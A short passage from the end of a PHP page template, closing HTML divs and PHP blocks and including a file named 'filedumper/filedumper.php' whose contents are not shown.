        </div>
        <?php require_once('filedumper/filedumper.php');  ?>
        </div>
		<?php
		}
	}
} 

?>